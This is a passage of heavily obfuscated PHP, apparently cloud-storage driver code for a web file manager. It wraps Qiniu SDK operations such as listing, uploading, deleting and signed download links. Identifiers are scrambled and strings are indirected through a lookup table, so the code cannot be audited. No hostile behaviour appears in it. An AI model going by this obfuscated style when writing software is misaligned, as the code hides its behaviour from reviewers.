IO::copy($÷Ÿ´æìÖ[$_SERVER[ ÇƒŠìÀ][86]], $¢˜•‚, !1, $Òš€¾’²); return $§†Òí×; } public function setModifyTime($²Ñ…èÙ¬, $Ï“ü±öŠ = '') { $©ñ”§ô =& $_SERVER[ ÇƒŠìÀ]; if (!$²Ñ…èÙ¬) { return; } $this->model->where(array($©ñ”§ô[461] => $²Ñ…èÙ¬))->save(array($©ñ”§ô[87] => $Ï“ü±öŠ)); } public function upload($ßüê¿›•, $åş×Ä‹ñ, $Ï¦ÍÙòè = false, $ÓªÒ’ø¾ = REPEAT_REPLACE) { $ßÚñ ¦¬ =& $_SERVER[ ÇƒŠìÀ]; $ğÛªêûÚ = $this->parse($ßüê¿›•); $÷İ‹Æ˜ê = $this->model->addFile($ğÛªêûÚ[$ßÚñ ¦¬[445]], $åş×Ä‹ñ, $ğÛªêûÚ[$ßÚñ ¦¬[86]], $Ï¦ÍÙòè, $ÓªÒ’ø¾); return $this->getPathOuter($÷İ‹Æ˜ê); } public function uploadFileByID($…Ãø¦¨ò, $İ¹Ù¨ˆè, $˜±‡‹÷ù) { $ß¡ àûˆ =& $_SERVER[ ÇƒŠìÀ]; $´’Ù  = $this->parse($…Ãø¦¨ò); $¢§ò‚á· = $this->model->addFileByFileID($´’Ù [$ß¡ àûˆ[445]], $İ¹Ù¨ˆè, $´’Ù [$ß¡ àûˆ[86]], $˜±‡‹÷ù); return $this->getPathOuter($¢§ò‚á·); } public function addFileByRemote($åëŒçúí, $óÛÜÀšå, $ã¾¤¾…Ì = array(), $ ˜ÄõÀü = '', $šÙÕ¬À–) { $—©ù¸ô˜ =& $_SERVER[ ÇƒŠìÀ]; $Ú«¨ÒÓ = $this->parse($åëŒçúí); $ ˜ÄõÀü = empty($ ˜ÄõÀü) ? $Ú«¨ÒÓ[$—©ù¸ô˜[86]] : $ ˜ÄõÀü; $…Ö”à§ = $this->model->addFileByRemote($Ú«¨ÒÓ[$—©ù¸ô˜[445]], $óÛÜÀšå, $ ˜ÄõÀü, $ã¾¤¾…Ì, $šÙÕ¬À–); return $this->getPathOuter($…Ö”à§); } public function uploadLink($¡ƒãî©á, $Ì¸¨œñÎ = 0) { $ş†¼ŞÕ¶ =& $_SERVER[ ÇƒŠìÀ]; $ÍÖ±áôÌ = $this->parse($¡ƒãî©á); $²Ïøí¸ğ = _get($GLOBALS[$ş†¼ŞÕ¶[7]], $ş†¼ŞÕ¶[1370]); $×Å«È› = _get($GLOBALS[$ş†¼ŞÕ¶[7]], $ş†¼ŞÕ¶[1371]); $¡ƒãî©á = Model($ş†¼ŞÕ¶[644])->createFileName($ÍÖ±áôÌ[$ş†¼ŞÕ¶[86]], $²Ïøí¸ğ, $×Å«È›); return IO::uploadLink($¡ƒãî©á, $Ì¸¨œñÎ); } public function fileNameAuto($ã¡µã, $Ò‹ÄŒóÇ, $òÂğ²ìÇ = REPEAT_REPLACE, $É¹ÛÄéæ = false) { return $this->model->fileNameAuto($ã¡µã, $Ò‹ÄŒóÇ, $òÂğ²ìÇ, $É¹ÛÄéæ); } public function fileNameExist($ó´ù½ö·, $÷‰ó×¥) { return $this->model->fileNameExist($ó´ù½ö·, $÷‰ó×¥); } protected function _fileOut($êÍÑÔûî, $µŸÍâÙÒ = false, $Ÿñå¦¢¤ = false, $ÅÎ×ÛÛ = '', $§áş¹íŸ = false) { $¸ÀÍÑ¨ =& $_SERVER[ ÇƒŠìÀ]; $«¦†çª‚ = $this->model->sourceInfo($êÍÑÔûî); if ($«¦†çª‚[$¸ÀÍÑ¨[455]] == $¸ÀÍÑ¨[90]) { header($¸ÀÍÑ¨[1372]); die; } $À¥Ç²–ß = $this->model->fileInfoGet($êÍÑÔûî); $ÅÎ×ÛÛ = $À¥Ç²–ß[$¸ÀÍÑ¨[517]] ? $À¥Ç²–ß[$¸ÀÍÑ¨[517]] : $ÅÎ×ÛÛ; $çü°¼ù = is_array($GLOBALS[$¸ÀÍÑ¨[171]]) ? $GLOBALS[$¸ÀÍÑ¨[171]][$¸ÀÍÑ¨[32]] : $«¦†çª‚[$¸ÀÍÑ¨[32]]; if ($§áş¹íŸ) { return IO::fileOutServer($À¥Ç²–ß[$¸ÀÍÑ¨[86]], $µŸÍâÙÒ, $çü°¼ù, $ÅÎ×ÛÛ); } IO::fileOut($À¥Ç²–ß[$¸ÀÍÑ¨[86]], $µŸÍâÙÒ, $çü°¼ù, $ÅÎ×ÛÛ); } public function fileOut($•ãé¢ï§, $Ò¤”¸§ı = false, $·›ÕĞÀŸ = false, $§•õ†Ü‚ = '') { $this->_fileOut($•ãé¢ï§, $Ò¤”¸§ı, $·›ÕĞÀŸ, $§•õ†Ü‚); } public function fileOutServer($Èµ¸¿Úï, $Ã•Óç¤ˆ = false, $ËË²ËÈ¹ = false, $„šÓŸÒ• = '') { $this->_fileOut($Èµ¸¿Úï, $Ã•Óç¤ˆ, $ËË²ËÈ¹, $„šÓŸÒ•, !0); } protected function _fileOutImage($°è©ûÎŠ, $×Ù•²¿ö = 250) { $šÃÇ¼ıó =& $_SERVER[ ÇƒŠìÀ]; $ÎË¸‘ä = $this->model->pathInfo($°è©ûÎŠ); if ($ÎË¸‘ä[$šÃÇ¼ıó[455]] == $šÃÇ¼ıó[90]) { show_json($šÃÇ¼ıó[1373] . $°è©ûÎŠ, !1); } $àÓ•¹â = $this->model->fileInfoGet($°è©ûÎŠ); $ÎË¸‘ä[$šÃÇ¼ıó[172]] = $àÓ•¹â[$šÃÇ¼ıó[86]]; $GLOBALS[$šÃÇ¼ıó[171]] = $ÎË¸‘ä; IO::fileOutImage($àÓ•¹â[$šÃÇ¼ıó[86]], $×Ù•²¿ö); } public function fileOutImage($ÉŠÁÂÜ—, $Ôãíè˜¨ = 250) { $this->_fileOutImage($ÉŠÁÂÜ—, $Ôãíè˜¨); } public function fileOutImageServer($ÛóÓ©£‹, $¢¡Šé¯© = 250) { $this->_fileOutImage($ÛóÓ©£‹, $¢¡Šé¯©); } public function link($‚Œê’–¼, $«÷¶æ¾ä = '') { $÷Öë®ÑÓ = $this->model->fileInfoGet($‚Œê’–¼); return IO::link($÷Öë®ÑÓ[$_SERVER[ ÇƒŠìÀ][86]], $«÷¶æ¾ä); } protected function parse($şˆîÕêÄ) { $¡³òíŞ =& $_SERVER[ ÇƒŠìÀ]; if (strstr($şˆîÕêÄ, $¡³òíŞ[8]) === !1) { return array($¡³òíŞ[463] => intval($şˆîÕêÄ), $¡³òíŞ[86] => $¡³òíŞ[12], $¡³òíŞ[1369] => array()); } $ÈªÚõªÄ = explode($¡³òíŞ[8], trim($şˆîÕêÄ, $¡³òíŞ[8])); if (count($ÈªÚõªÄ) < 2) { show_tips(clear_html($şˆîÕêÄ) . $¡³òíŞ[1374]); } return array($¡³òíŞ[463] => intval($ÈªÚõªÄ[0]), $¡³òíŞ[86] => $ÈªÚõªÄ[1], $¡³òíŞ[1369] => array_slice($ÈªÚõªÄ, 1)); } } goto aÜÀ›¹Ğ¤; Dˆ°„Èßø: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($çœ°ë¬) { parent::__construct(); require_once SDK_DIR . $_SERVER[ ÇƒŠìÀ][1448]; $this->_init($çœ°ë¬); } public function _init($­şˆú›) { $äûÄĞñõ =& $_SERVER[ ÇƒŠìÀ]; $this->config = $­şˆú›; foreach ($­şˆú› as $üÔøıÆÊ => $ÙÆˆŞºá) { if (isset($this->{$üÔøıÆÊ})) { $this->{$üÔøıÆÊ} = $ÙÆˆŞºá; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($äûÄĞñõ[1449] . LNG($äûÄĞñõ[1408])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ªÙÊğü, $±×‡·ëÙ = '', $¯éµı÷ë = REPEAT_RENAME) { if ($this->setContent($ªÙÊğü, $±×‡·ëÙ)) { return $this->getPathOuter($ªÙÊğü); } return !1; } public function mkdir($òÜ¬öûî, $âÎÛ‹ü´ = REPEAT_SKIP) { $»òù›Ï– =& $_SERVER[ ÇƒŠìÀ]; $¥ÆŒÙõ = trim($òÜ¬öûî, $»òù›Ï–[8]); if ($this->_isFolder($¥ÆŒÙõ)) { return $this->getPathOuter($¥ÆŒÙõ); } $òÜ¬öûî = $¥ÆŒÙõ . $»òù›Ï–[8]; $ÏÜøĞ©Õ = get_path_this($¥ÆŒÙõ); $Ù†‰Ú® = $òÜ¬öûî . $ÏÜøĞ©Õ; if (!$this->mkfile($Ù†‰Ú®)) { return !1; } if (!$this->moveFile($Ù†‰Ú®, $òÜ¬öûî)) { $this->delFile($Ù†‰Ú®); return !1; } return $this->getPathOuter($¥ÆŒÙõ); } public function copyFile($¨šÁ•ğ, $ñØë§ÎÕ) { $ş³ÄÊÀä = $this->bucketManager->copy($this->bucket, $¨šÁ•ğ, $this->bucket, $ñØë§ÎÕ, !0); return $ş³ÄÊÀä ? !1 : $this->getPathOuter($ñØë§ÎÕ); } public function moveFile($ïöõùã’, $Ÿš½ôœø) { $„æŒ´ü— = $this->bucketManager->move($this->bucket, $ïöõùã’, $this->bucket, $Ÿš½ôœø, !0); return $„æŒ´ü— ? !1 : $this->getPathOuter($Ÿš½ôœø); } public function delFile($Ş¬âıç†) { if (!$this->exist($Ş¬âıç†)) { return !0; } $ˆşâ¨‰‚ = $this->bucketManager->delete($this->bucket, $Ş¬âıç†); return $ˆşâ¨‰‚ ? !1 : !0; } public function delFolder($…–Ó¼„) { $‹“ “ÖÈ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->exist($…–Ó¼„)) { return !0; } $this->listItemCache = !1; $€î†Õ÷‚ = $this->fileList($…–Ó¼„); $this->listItemCache = !0; $¡ŠÃŠª = trim($…–Ó¼„, $‹“ “ÖÈ[8]) . $‹“ “ÖÈ[8]; if (!empty($…–Ó¼„) && $…–Ó¼„ !== $‹“ “ÖÈ[214] && !in_array($¡ŠÃŠª, $€î†Õ÷‚[$‹“ “ÖÈ[84]])) { $€î†Õ÷‚[$‹“ “ÖÈ[84]][] = $¡ŠÃŠª; } $¥ù¤ò É = $this->delByBatch($€î†Õ÷‚[$‹“ “ÖÈ[85]]); if (!$¥ù¤ò É) { return !1; } $¥ù¤ò É = $this->delByBatch($€î†Õ÷‚[$‹“ “ÖÈ[84]]); if (!$¥ù¤ò É) { return !1; } return $this->delFile($¡ŠÃŠª); } private function delByBatch($İÀ´Ê¹») { foreach (array_chunk($İÀ´Ê¹», 1000) as $ñµ¬¢¶ó) { $·ıë¨ğ¥ = $this->bucketManager->buildBatchDelete($this->bucket, $ñµ¬¢¶ó); list($¥¯°Èê³, $…í¨èÑÈ) = $this->bucketManager->batch($·ıë¨ğ¥); if ($…í¨èÑÈ) { return !1; } } return !0; } public function rename($õ¤ç®Š€, $Šç‰‘¢‹) { return $this->renameObject($õ¤ç®Š€, $Šç‰‘¢‹); } public function fileInfo($»¸ã©Ú, $ÆÅëíÓñ = false, $Ú±ï‹™ï = array()) { $ÑÃõÍ­ˆ =& $_SERVER[ ÇƒŠìÀ]; $ŒÆïƒ… = array($ÑÃõÍ­ˆ[32] => $this->pathThis($»¸ã©Ú), $ÑÃõÍ­ˆ[86] => $this->getPathOuter($ÑÃõÍ­ˆ[8] . $»¸ã©Ú), $ÑÃõÍ­ˆ[33] => $ÑÃõÍ­ˆ[216], $ÑÃõÍ­ˆ[78] => isset($Ú±ï‹™ï[$ÑÃõÍ­ˆ[1450]]) ? $Ú±ï‹™ï[$ÑÃõÍ­ˆ[1450]] : 0, $ÑÃõÍ­ˆ[177] => $this->ext($»¸ã©Ú)); if ($ÆÅëíÓñ) { return $ŒÆïƒ…; } $ŒÆïƒ…[$ÑÃõÍ­ˆ[217]] = $ŒÆïƒ…[$ÑÃõÍ­ˆ[87]] = 0; $ŒÆïƒ…[$ÑÃõÍ­ˆ[218]] = $ŒÆïƒ…[$ÑÃõÍ­ˆ[219]] = !0; if (empty($Ú±ï‹™ï)) { $Ú±ï‹™ï = $this->objectMeta($»¸ã©Ú); if (!$Ú±ï‹™ï) { return $ŒÆïƒ…; } } if (isset($Ú±ï‹™ï[$ÑÃõÍ­ˆ[220]]) && $Ú±ï‹™ï[$ÑÃõÍ­ˆ[220]]) { $ŒÆïƒ…[$ÑÃõÍ­ˆ[221]] = $Ú±ï‹™ï[$ÑÃõÍ­ˆ[220]]; } if (isset($Ú±ï‹™ï[$ÑÃõÍ­ˆ[230]]) && $Ú±ï‹™ï[$ÑÃõÍ­ˆ[230]]) { $ŒÆïƒ…[$ÑÃõÍ­ˆ[221]] = $Ú±ï‹™ï[$ÑÃõÍ­ˆ[230]]; } if (isset($Ú±ï‹™ï[$ÑÃõÍ­ˆ[1451]])) { $ŒÆïƒ…[$ÑÃõÍ­ˆ[87]] = substr($Ú±ï‹™ï[$ÑÃõÍ­ˆ[1451]] . $ÑÃõÍ­ˆ[12], 0, 10); } if (isset($Ú±ï‹™ï[$ÑÃõÍ­ˆ[1450]])) { $ŒÆïƒ…[$ÑÃõÍ­ˆ[78]] = $Ú±ï‹™ï[$ÑÃõÍ­ˆ[1450]]; } return $ŒÆïƒ…; } public function folderInfo($Ñ§¡¿ì, $—•Ğß‰ = false) { $…ÄÎ¸¦– =& $_SERVER[ ÇƒŠìÀ]; $ë¢Âá = array($…ÄÎ¸¦–[32] => $this->pathThis($Ñ§¡¿ì), $…ÄÎ¸¦–[86] => $this->getPathOuter($…ÄÎ¸¦–[8] . $Ñ§¡¿ì), $…ÄÎ¸¦–[33] => $…ÄÎ¸¦–[77]); if ($—•Ğß‰) { return $ë¢Âá; } $ë¢Âá[$…ÄÎ¸¦–[217]] = $ë¢Âá[$…ÄÎ¸¦–[87]] = 0; $ë¢Âá[$…ÄÎ¸¦–[218]] = $ë¢Âá[$…ÄÎ¸¦–[219]] = !0; $Ñ§¡¿ì = rtrim($Ñ§¡¿ì, $…ÄÎ¸¦–[8]) . $…ÄÎ¸¦–[8]; $ì‚”Ã—„ = $this->objectMeta($Ñ§¡¿ì); if (isset($ì‚”Ã—„[$…ÄÎ¸¦–[1451]])) { $ë¢Âá[$…ÄÎ¸¦–[87]] = substr($ì‚”Ã—„[$…ÄÎ¸¦–[1451]] . $…ÄÎ¸¦–[12], 0, 10); } return $ë¢Âá; } public function listPath($û’³ßîÜ, $Ñ¾Êİ‘ô = false) { $Ò‹Ü‘Æª =& $_SERVER[ ÇƒŠìÀ]; $“»¡¢Ê• = $this->fileList($û’³ßîÜ, $Ò‹Ü‘Æª[8], !0); foreach ($“»¡¢Ê•[$Ò‹Ü‘Æª[84]] as $ê’ÁŸ¶… => $ü†½ÙºÎ) { $“»¡¢Ê•[$Ò‹Ü‘Æª[84]][$ê’ÁŸ¶…] = $this->folderInfo($ü†½ÙºÎ, $Ñ¾Êİ‘ô); } foreach ($“»¡¢Ê•[$Ò‹Ü‘Æª[85]] as $ê’ÁŸ¶… => $ü†½ÙºÎ) { $“»¡¢Ê•[$Ò‹Ü‘Æª[85]][$ê’ÁŸ¶…] = $this->fileInfo($ü†½ÙºÎ[$Ò‹Ü‘Æª[96]], $Ñ¾Êİ‘ô, $ü†½ÙºÎ); } return $“»¡¢Ê•; } public function has($ºÈ‡¨–ù, $Œú¬ô°ê = false, $Ñ•©™ş = true) { $ŞŒ‚±úú =& $_SERVER[ ÇƒŠìÀ]; $ºÈ‡¨–ù = trim($ºÈ‡¨–ù, $ŞŒ‚±úú[8]); $¾¢¾‹š = empty($ºÈ‡¨–ù) && $ºÈ‡¨–ù !== $ŞŒ‚±úú[214] ? $ŞŒ‚±úú[12] : $ºÈ‡¨–ù . $ŞŒ‚±úú[8]; $ıÍöÉ× = $ŞŒ‚±úú[12]; $×¹ËÇŒ = 500; $À©Ãƒ†‚ = $ŞŒ‚±úú[8]; $¶±€ò–š = $­ôöÙš” = 0; while (!0) { check_abort(); list($ºÊøâ¿Ş, $¿òÄ”ª¬) = $this->bucketManager->listFiles($this->bucket, $¾¢¾‹š, $ıÍöÉ×, $×¹ËÇŒ, $À©Ãƒ†‚); if ($¿òÄ”ª¬) { break; } $ıÍöÉ× = array_key_exists($ŞŒ‚±úú[1420], $ºÊøâ¿Ş) ? $ıÍöÉ× = $ºÊøâ¿Ş[$ŞŒ‚±úú[1452]] : $ŞŒ‚±úú[12]; if ($Œú¬ô°ê) { if (!empty($ºÊøâ¿Ş[$ŞŒ‚±úú[1453]])) { $¶±€ò–š += count($ºÊøâ¿Ş[$ŞŒ‚±úú[1453]]); } if (!empty($ºÊøâ¿Ş[$ŞŒ‚±úú[1454]])) { $­ôöÙš” += count($ºÊøâ¿Ş[$ŞŒ‚±úú[1454]]); } if ($ıÍöÉ× === $ŞŒ‚±úú[12]) { break; } continue; } if ($Ñ•©™ş) { if (!empty($ºÊøâ¿Ş[$ŞŒ‚±úú[1453]])) { return !0; } } else { if (!empty($ºÊøâ¿Ş[$ŞŒ‚±úú[1454]])) { return !0; } } if ($ıÍöÉ× === $ŞŒ‚±úú[12]) { break; } } if ($Œú¬ô°ê) { return array($ŞŒ‚±úú[225] => $¶±€ò–š, $ŞŒ‚±úú[226] => $­ôöÙš”); } return !1; } public function listAll($ÓœË¤ô) { $ê¤Ë•¹ú =& $_SERVER[ ÇƒŠìÀ]; $Ü°œĞÚæ = $this->fileList($ÓœË¤ô, $ê¤Ë•¹ú[12], !0); $åË¨ÓàĞ = array_to_keyvalue($Ü°œĞÚæ[$ê¤Ë•¹ú[85]], $ê¤Ë•¹ú[32]); foreach ($Ü°œĞÚæ[$ê¤Ë•¹ú[84]] as $€Ù€Òœ×) { if (is_string($€Ù€Òœ×)) { $åË¨ÓàĞ[$€Ù€Òœ×] = array($ê¤Ë•¹ú[78] => 0); } } return $this->listAllFiles($ÓœË¤ô, $åË¨ÓàĞ); } private function fileList($™¡Úæ²µ, $‰¶öÅƒİ = '', $‡—éÉïÜ = 0) { $½’©²ûµ =& $_SERVER[ ÇƒŠìÀ]; $™¡Úæ²µ = trim($™¡Úæ²µ, $½’©²ûµ[8]); $À·÷¸µ = empty($™¡Úæ²µ) && $™¡Úæ²µ !== $½’©²ûµ[214] ? $½’©²ûµ[12] : $™¡Úæ²µ . $½’©²ûµ[8]; $¡ÏäÃÃÅ = $½’©²ûµ[12]; $½÷ŒÀõ = 1000; $œ—Æè©ˆ = $ü¶¿ = array(); while (!0) { check_abort(); list($íã¾÷àÈ, $ç“ªˆ¯) = $this->bucketManager->listFiles($this->bucket, $À·÷¸µ, $¡ÏäÃÃÅ, $½÷ŒÀõ, $‰¶öÅƒİ); if ($ç“ªˆ¯) { break; } $¡ÏäÃÃÅ = array_key_exists($½’©²ûµ[1420], $íã¾÷àÈ) ? $¡ÏäÃÃÅ = $íã¾÷àÈ[$½’©²ûµ[1452]] : $½’©²ûµ[12]; $…óÊôĞª = isset($íã¾÷àÈ[$½’©²ûµ[1453]]) ? $íã¾÷àÈ[$½’©²ûµ[1453]] : array(); $Áğµô‘Û = isset($íã¾÷àÈ[$½’©²ûµ[1454]]) ? $íã¾÷àÈ[$½’©²ûµ[1454]] : array(); foreach ($…óÊôĞª as $±øÙàèş) { if ($±øÙàèş[$½’©²ûµ[96]] == $À·÷¸µ) { continue; } $‚’Ğ®Ç´ = $±øÙàèş[$½’©²ûµ[96]]; $ª‰ı‹•– = $±øÙàèş[$½’©²ûµ[1450]]; $±øÙàèş[$½’©²ûµ[78]] = $ª‰ı‹•–; $¹·«é˜ë = $ª‰ı‹•– == 0 && substr($‚’Ğ®Ç´, strlen($‚’Ğ®Ç´) - 1, 1) == $½’©²ûµ[8] ? !0 : !1; $this->cacheMethodInfoSet($‚’Ğ®Ç´, $¹·«é˜ë, $±øÙàèş); if ($¹·«é˜ë) { $œ—Æè©ˆ[] = $‚’Ğ®Ç´; continue; } $ü¶¿[] = $‡—éÉïÜ ? $±øÙàèş : $‚’Ğ®Ç´; } foreach ($Áğµô‘Û as $‚’Ğ®Ç´) { if ($‚’Ğ®Ç´ == $À·÷¸µ) { continue; } $œ—Æè©ˆ[] = $‚’Ğ®Ç´; $this->cacheMethodInfoSet($‚’Ğ®Ç´, !0); } if ($¡ÏäÃÃÅ === $½’©²ûµ[12]) { break; } } $this->cacheMethodInfoSet($™¡Úæ²µ, !0); return array($½’©²ûµ[84] => $œ—Æè©ˆ, $½’©²ûµ[85] => $ü¶¿); } public function canRead($©»‡ïÖ) { return $this->exist($©»‡ïÖ) ? !0 : !1; } public function canWrite($ä›ïœ§) { return $this->exist($ä›ïœ§) ? !0 : !1; } public function getContent($¶€Óè ¬) { return $this->fileSubstr($¶€Óè ¬, 0, -1); } public function setContent($şÙğ¬³œ, $ğ–¸òæ¡ = '') { $‚–èÂĞ® = $this->tempFile($this->pathThis($şÙğ¬³œ)); file_put_contents($‚–èÂĞ®, $ğ–¸òæ¡); if ($this->upload($şÙğ¬³œ, $‚–èÂĞ®)) { $this->tempFileRemve($‚–èÂĞ®); return !0; } return !1; } public function refreshUrls($ƒòŞÊş£) { $¶ß¨Ğ†¦ =& $_SERVER[ ÇƒŠìÀ]; $àïßŒï¥ = array(); if (is_array($ƒòŞÊş£)) { foreach ($ƒòŞÊş£ as $ÔĞÊŞ«‰) { $àïßŒï¥[] = $this->link($ÔĞÊŞ«‰); } } else { $àïßŒï¥[] = $this->link($ƒòŞÊş£); } $ÃÉùÈÅ = new Qiniu\Cdn\CdnManager($this->auth); list($ ˆ¾²û, $¥‹Òİúİ) = $ÃÉùÈÅ->refreshUrls($àïßŒï¥); if ($¥‹Òİúİ) { return !1; } return $ ˆ¾²û[$¶ß¨Ğ†¦[1217]] == $¶ß¨Ğ†¦[788] ? !0 : !1; } public function fileSubstr($÷µĞ€½, $Á‘şìÏ, $˜¡Å¬¨²) { $§æÖºšñ =& $_SERVER[ ÇƒŠìÀ]; if (!($‘ÑÌ—Æô = $this->link($÷µĞ€½))) { return !1; } $†íœâäÀ = !1; if ($˜¡Å¬¨² > 0) { $‰æà›€½ = $Á‘şìÏ + $˜¡Å¬¨² - 1; $†íœâäÀ = array($§æÖºšñ[1455] . $Á‘şìÏ . $§æÖºšñ[432] . $‰æà›€½); } $÷÷Šøû« = url_request($‘ÑÌ—Æô, $§æÖºšñ[247], !1, $†íœâäÀ); return $÷÷Šøû«[$§æÖºšñ[779]] ? $÷÷Šøû«[$§æÖºšñ[1237]] : !1; } public function upload($È’ò—­´, $»–Ì…ßñ, $ğ…´”İ = false, $ìÓ€÷Ãå = REPEAT_REPLACE) { $µä†÷­« = new Qiniu\Storage\UploadManager(); $¶—ã—³ñ = $this->auth->uploadToken($this->bucket, $È’ò—­´); $ÏÄùå = get_file_mime(get_path_ext($»–Ì…ßñ)); list($„¦ªçÓ, $Á¢ËŞï¤) = $µä†÷­«->putFile($¶—ã—³ñ, $È’ò—­´, $»–Ì…ßñ, null, $ÏÄùå); return $Á¢ËŞï¤ ? !1 : $this->getPathOuter($È’ò—­´); } public function uploadFormData($èÃÚçø÷, $òÖ¾ÍªÂ = 3600) { return $this->uploadToken($èÃÚçø÷, $òÖ¾ÍªÂ); } public function multiUploadFormData($â©Ü÷ë, $´¼ıí = 3600) { return $this->uploadToken($â©Ü÷ë, $´¼ıí); } private function uploadToken($ó—‹³Áæ, $å¶ş–ò = 3600) { $Œˆ¬¬¾§ =& $_SERVER[ ÇƒŠìÀ]; $ùÑİ¢©¦ = $å¶ş–ò; $ˆ²Ú½ = array($Œˆ¬¬¾§[1456] => $Œˆ¬¬¾§[1457]); $œœÚˆ‡‡ = $ó—‹³Áæ; $¤øÁúÚı = $this->auth->uploadToken($this->bucket, $œœÚˆ‡‡, $ùÑİ¢©¦, $ˆ²Ú½, !0); $èğÙÏÙı = empty($this->region) || $this->region == $Œˆ¬¬¾§[1458] ? $Œˆ¬¬¾§[12] : $Œˆ¬¬¾§[432] . $this->region; $àšî”ŠÈ = http_type() . "\72\x2f\57\165\x70\x6c\x6f\x61\x64{$èğÙÏÙı}\56\161\x69\156\151\165\x70\x2e\x63\x6f\x6d\x2f"; return array($Œˆ¬¬¾§[1459] => $¤øÁúÚı, $Œˆ¬¬¾§[1460] => $àšî”ŠÈ); } public function download($Å²‚Ê², $¯³¯ïòÉ) { $à´ÃäÎõ = IO::getPathInner(IO::mkfile($¯³¯ïòÉ)); if (!($æÃØ·¥Ü = $this->link($Å²‚Ê²))) { return !1; } $ÈÔÁ½ùÍ = 0; $¦»äÜ·ä = 1024 * 200; $‚¡İ´°¥ = fopen($à´ÃäÎõ, $_SERVER[ ÇƒŠìÀ][1461]); while (!0) { $«å–³†é = $this->fileSubstr($Å²‚Ê², $ÈÔÁ½ùÍ, $¦»äÜ·ä); if ($«å–³†é === !1) { return !1; } fwrite($‚¡İ´°¥, $«å–³†é); $ÈÔÁ½ùÍ += $¦»äÜ·ä; if (strlen($«å–³†é) < $¦»äÜ·ä) { break; } } fclose($‚¡İ´°¥); return $¯³¯ïòÉ; } public function link($ Ş¢Ş±õ, $ş¤­ï¹Ù = '') { if (!$this->isFile($ Ş¢Ş±õ)) { return !1; } $ûƒÅÔï = $this->getHost() . $_SERVER[ ÇƒŠìÀ][8] . $this->pathEncode($ Ş¢Ş±õ) . $ş¤­ï¹Ù; return $this->auth->privateDownloadUrl($ûƒÅÔï, 3600 * 12); } public function fileOut($Íû‹Ïâ¹, $×ª£ ³ş = false, $èÒà°·ı = false, $Í–ª¯Ø§ = '') { $öÅÓó«÷ =& $_SERVER[ ÇƒŠìÀ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Íû‹Ïâ¹, $×ª£ ³ş, $èÒà°·ı, $Í–ª¯Ø§); } if (!$èÒà°·ı) { $èÒà°·ı = $this->pathThis($Íû‹Ïâ¹); } $½ü¶©“Ğ = $×ª£ ³ş ? $öÅÓó«÷[1462] . rawurlencode($èÒà°·ı) : $öÅÓó«÷[12]; $ƒ†à®„ = $this->link($Íû‹Ïâ¹, $½ü¶©“Ğ); $this->fileOutLink($ƒ†à®„); } public function fileOutServer($ŒäÊË·, $˜şĞÜøÔ = false, $ÏÚæ®œè = false, $Ü¶¨¶ÌÆ = '') { parent::fileOut($ŒäÊË·, $˜şĞÜøÔ, $ÏÚæ®œè, $Ü¶¨¶ÌÆ); } public function fileOutImage($ÖÛÒ²àı, $ÌÓ‹Á»Š = 250) { $ñ‡¤ = $this->link($ÖÛÒ²àı, $_SERVER[ ÇƒŠìÀ][1463] . $ÌÓ‹Á»Š); $this->fileOutLink($ñ‡¤); } public function fileOutImageServer($«Îî±íæ, $¤¿˜‡’º = 250) { parent::fileOutImage($«Îî±íæ, $¤¿˜‡’º); } public function hashMd5($¦Ó«çÂĞ) { $­“øµê× =& $_SERVER[ ÇƒŠìÀ]; $ãÁÃß˜ú = $this->objectMeta($¦Ó«çÂĞ); return isset($ãÁÃß˜ú[$­“øµê×[230]]) ? $ãÁÃß˜ú[$­“øµê×[230]] : !1; $âáÃ§ç† = $this->link($¦Ó«çÂĞ, $­“øµê×[1464]); } public function size($±Ù©Ò¤í) { $é±µ°–÷ = $this->objectMeta($±Ù©Ò¤í); return $é±µ°–÷ ? $é±µ°–÷[$_SERVER[ ÇƒŠìÀ][78]] : 0; } public function info($Àà¨²†Ğ) { if ($this->isFolder($Àà¨²†Ğ)) { return $this->folderInfo($Àà¨²†Ğ); } else { if ($this->isFile($Àà¨²†Ğ)) { return $this->fileInfo($Àà¨²†Ğ); } } return !1; } public function exist($Âö´ğìç) { return $this->isFile($Âö´ğìç) || $this->isFolder($Âö´ğìç); } public function isFile($’Ã¬àğÎ) { return !$this->isFolder($’Ã¬àğÎ) && $this->objectMeta($’Ã¬àğÎ); } public function isFolder($¹ôš¹çİ) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][168], $¹ôš¹çİ); } protected function objectMeta($—ùâªı…) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][170], $—ùâªı…); } protected function _objectMeta($ìØ—½õß) { $¨”Øû =& $_SERVER[ ÇƒŠìÀ]; list($Üş­ÙÄ, $×†İ±È) = $this->bucketManager->stat($this->bucket, $ìØ—½õß); if ($Üş­ÙÄ) { $Üş­ÙÄ[$¨”Øû[78]] = intval($Üş­ÙÄ[$¨”Øû[1450]]); } return $Üş­ÙÄ; } protected function _isFolder($÷¶º¼€) { $Ã˜’•¹ =& $_SERVER[ ÇƒŠìÀ]; if ($÷¶º¼€ == $Ã˜’•¹[12] || $÷¶º¼€ == $Ã˜’•¹[8]) { return !0; } list($ù˜›‘÷¥, $ñˆ™şü¹) = $this->bucketManager->listFiles($this->bucket, trim($÷¶º¼€, $Ã˜’•¹[8]) . $Ã˜’•¹[8], $Ã˜’•¹[12], 1, $Ã˜’•¹[8]); return !empty($ù˜›‘÷¥[$Ã˜’•¹[1453]]) || !empty($ù˜›‘÷¥[$Ã˜’•¹[1454]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($àÉğú) { parent::__construct($àÉğú); } public function uploadFormData($µ÷üÃ±ù, $…Õ²·õé = 3600) { $Ó¶Óù†§ =& $_SERVER[ ÇƒŠìÀ]; $úŸô¹í = $Ó¶Óù†§[215]; $±ÜĞ‡Å = $Ó¶Óù†§[255]; $Ï–òŸÍÙ = $Ó¶Óù†§[62]; $ÉŒşÑ¼ = 